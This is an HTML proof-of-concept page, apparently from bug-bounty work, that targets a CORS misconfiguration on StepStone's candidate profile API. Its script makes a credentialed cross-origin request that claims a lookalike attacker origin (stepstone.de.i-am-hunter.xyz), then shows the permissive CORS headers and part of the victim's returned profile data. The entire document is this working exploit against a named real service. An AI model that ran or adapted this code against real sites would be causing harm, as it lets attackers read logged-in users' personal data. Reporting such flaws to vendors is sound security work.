<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - StepStone</title>
</head>
<body>
    <h1>CORS Misconfiguration PoC</h1>
    <button onclick="exploit()">Run Exploit</button>
    <div id="result"></div>

    <script>
    async function exploit() {
        try {
            const response = await fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
                method: 'GET',
                credentials: 'include',
                headers: {
                    'Origin': 'https://www.stepstone.de.i-am-hunter.xyz'
                }
            });
            
            const resultDiv = document.getElementById('result');
            
            // Show CORS headers
            const acao = response.headers.get('Access-Control-Allow-Origin');
            const acac = response.headers.get('Access-Control-Allow-Credentials');
            
            resultDiv.innerHTML = `
                <h3>CORS Headers:</h3>
                <p>Access-Control-Allow-Origin: <strong>${acao}</strong></p>
                <p>Access-Control-Allow-Credentials: <strong>${acac}</strong></p>
            `;
            
            if (response.ok) {
                const data = await response.json();
                resultDiv.innerHTML += `
                    <h3>Data Retrieved (partial):</h3>
                    <pre>${JSON.stringify(data, null, 2).substring(0, 1000)}...</pre>
                `;
            } else {
                resultDiv.innerHTML += `<p>Status: ${response.status}</p>`;
            }
        } catch (error) {
            document.getElementById('result').innerHTML = `Error: ${error.message}`;
        }
    }
    </script>
</body>
</html>
